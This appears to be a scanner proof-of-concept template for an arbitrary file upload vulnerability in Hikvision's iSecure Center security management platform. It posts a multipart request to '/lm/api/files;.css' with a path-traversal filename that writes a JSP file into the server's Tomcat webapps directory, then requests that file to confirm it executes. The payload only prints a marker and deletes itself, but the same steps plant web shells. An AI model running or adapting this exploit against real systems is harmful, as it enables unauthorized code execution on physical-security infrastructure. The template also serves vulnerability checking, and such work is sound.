{
        'name': '海康威视iSecure Center综合安防管理平台lm任意文件上传',
        'poc':[{'requests':{
            'method': 'post',
            'payload': '/lm/api/files;.css',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1',
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryVBf7Cs8QWsfwC82M'
            },
            'data': """------WebKitFormBoundaryVBf7Cs8QWsfwC82M
 Content-Disposition: form-data; name="file"; 
filename="../../../../../tomcat85linux64.1/webapps/els/static/axaaxs.jsp"
 Content-Type: application/zip
<% out.println("testaxssax");new 
java.io.File(application.getRealPath(request.getServletPath())).delete();%>------WebKitFormBoundaryVBf7Cs8QWsfwC82M--""",
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': False,
            'text': False
        }},
        {'requests':{
            'method': 'get',
            'payload': '/els/static/axaaxs.jsp',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1',
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'keep-alive',
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': False,
            'text': 'testaxssax'
        }}]
    }